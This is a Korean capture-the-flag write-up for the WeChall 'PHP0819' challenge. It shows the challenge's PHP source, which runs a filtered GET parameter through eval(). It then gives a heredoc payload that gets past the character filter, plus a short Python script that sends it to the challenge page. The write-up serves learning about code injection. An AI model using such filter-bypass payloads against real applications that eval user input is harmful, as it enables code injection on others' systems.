================================================================================================================
[wechall] PHP8019
================================================================================================================

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4 -> step6 -> step8;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5 -> step7 -> step9;
        }
        step0 -> step1[label="",arrowhead="normal"];
        step3 -> step2[label="@solve",arrowhead="normal"];
    }

|

Source Analysis
================================================================================================================


.. code-block:: php

    <?php
    // closure, because of namespace!
    $challenge = function()
    {
        $f = Common::getGetString('eval');
        $f = str_replace(array('`', '$', '*', '#', ':', '\\', '"', "'", '(', ')', '.', '>'), '', $f);

        if((strlen($f) > 13) || (false !== stripos($f, 'return')))
        {
            die('sorry, not allowed!');
        }

        try
        {
            eval("\$spaceone = $f");
        }
        catch (Exception $e)
        {
            return false;
        }

        return ($spaceone === '1337');
    };
    ?>


|


solve
================================================================================================================

- spaceone이 1337 문자열일 경우 풀리는 문제인데, eval=1337로 입력할 경우 int값으로 입력되어 에러가 출력됩니다.
- heredoc 구문을 이용하여 해결할 수 있습니다. "<<<"

http://zetawiki.com/wiki/PHP_%ED%9E%88%EC%96%B4%EB%8B%A5_heredoc


.. code-block:: php

    <<<a
    1337
    a;


.. code-blcok:: python


    import requests


    url = "http://www.wechall.net/challenge/space/php0819/index.php"
    
    params = {
        "eval": "%3C%3C%3Ca%0a1337%0aa;%0a"
    }

    r = requests.get(url, params=params, verify=False)
    print r.content
